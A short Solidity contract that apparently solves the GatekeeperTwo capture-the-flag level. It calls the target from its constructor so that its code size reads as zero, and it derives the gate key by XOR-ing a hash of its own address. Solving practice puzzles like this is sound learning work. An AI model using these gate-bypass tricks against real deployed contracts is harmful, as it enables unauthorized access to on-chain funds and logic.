// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGateKeeperTwo {
  function enter(bytes8 _gateKey) external;
}

contract GatekeeperTwoAttacker {
  IGateKeeperTwo gk2;

  constructor(address _address) {
    gk2 = IGateKeeperTwo(_address);
    attack();
  }

  function attack() internal {
    uint64 h = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    uint64 val;
    unchecked {
       val = (uint64(0) - 1) ^ h;
    }
    bytes8 gateKey = bytes8(val);
    gk2.enter(gateKey);
  }

}
